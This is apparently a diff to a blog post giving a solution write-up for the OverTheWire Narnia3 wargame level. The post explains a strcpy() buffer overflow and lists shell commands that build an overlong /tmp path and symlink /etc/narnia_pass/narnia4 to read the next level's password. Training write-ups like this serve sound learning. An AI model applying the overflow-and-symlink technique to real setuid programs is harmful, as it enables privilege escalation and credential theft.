@@ -2,11 +2,13 @@
 layout: post
 title:  "Narnia Level 3"
 date:   2015-10-12 12:52
-categories: narnia wargame pwnable overthewire
+categories: narnia wargame pwnable overthewire python c
 author: Leander
 ---
 
-This is a solution guide to the Narnia3 Level at [overthewire](http://overthewire.org/wargames/narnia/). This write-up was created on 6 October 2015.
+This is a solution guide to the Narnia3 Level at [overthewire](http://overthewire.org/wargames/narnia/). This write-up was created on 12 October 2015.
+
+<strong>Challenge Description:</strong> Narnia3 requires the attacker to take advantage of a <em>strcpy()</em> vulnerability which does not have any bounds checking. Since the <em>strcpy()</em> is executed blindly it creates a situation where the user can overwrite the buffer affecting all the variables in main. 
 <!--break-->
 
 First connect to the lab
@@ -138,13 +140,27 @@ Confirm the view of the stack by observing is at a designated breakpoint - 0x804
 
 ![gdb stack view at breakpoint](/images/narnia03_gdb_stack_view.png)
 
-Beginning at 0x8048526 the character string /dev/null for ofile is placed onto the top of the stack at esp+58, followed by ifile at esp+38 as shown at 0x8048579.
+Beginning at 0x8048526 the character string /dev/null for ofile is placed onto the top of the stack at esp+58. The next interesting point is around 0x8048579 where a strcpy operation takes arg[0] and copies it into ifile. If we reference our stack table now we can see what is happened to our input earlier, because the "abc" overflowed into the ofile!
 
 ![objdump screenshot with intel syntax](/images/narnia03_objdump_screenshot.png)
 
+Now it's time to craft our input to take advantage of this vulnerability. The general idea is that we are going to use two file names with the same name to pass as arguments to ifile and ofile. We will take advantage of the write function which was previously writing to /dev/null and make it write something else instead. Which if we create a symbollically linked file as our input we can read the key.
+
+{% highlight bash linenos %}
+python -c 'print(len("/tmp/" + "a"*27))' #verify our temp folder is long enough
+mkdir -p $(python -c 'print ("/tmp/" + "a"*27 + "/tmp")') #create the directory
+cd $(python -c 'print ("/tmp/" + "a"*27 + "/tmp")') #change to the directory
+ln -s /etc/narnia_pass/narnia4 abc #create the symbollically linked file
+touch /tmp/abc #create our temp file for the key
+chmod 777 /tmp/abc #where the key will be written
+/narnia/narnia3 `pwd`/abc #test our solution
+cat /tmp/abc #read key
+{% endhighlight %}
+
+BINGO! level 4 password is ```????```
 
 <h3>Footnotes:</h3>
 [^1]: I use the tmp folder because that is the one of the few globally write/read folders in the linux system from which I don't need a specific user's access privileages to use. This allows me to create folders inside /tmp which will be owned by myself and then still be able to read other folders or files inside the tmp directory, provided I know the file or directory name.
-[^2]: Keep in mind the reason the numbers I'm referencing are different than what is in the screenshot is because I am using decimal number references. It is only a matter of preference and is easier for me to read
+[^2]: The numbers I reference are different than what is in the screenshot because I am using decimal instead of hexadecimal number references. It is only a matter of preference and is easier for me to read.
 [^3]: How do I know it's 4 bytes for the variable? Well an integer value has a maximum value of 4,294,967,296. Which factors into a value of 2^32, and last 32 bits / 8, because 8 bits are in a byte, = 4 bytes.
 [^4]: First you have to make sure you have a readable file, next you need to open the file using gdb: ```gdb ./narnia3 test```. Next set a breakpoint: ```b *0x8048546``` and then type ```run```. Last, examine the stack with the following command: ```x /40xw $esp```. If you need to learn more about gdb check it out [here](link to gdb).
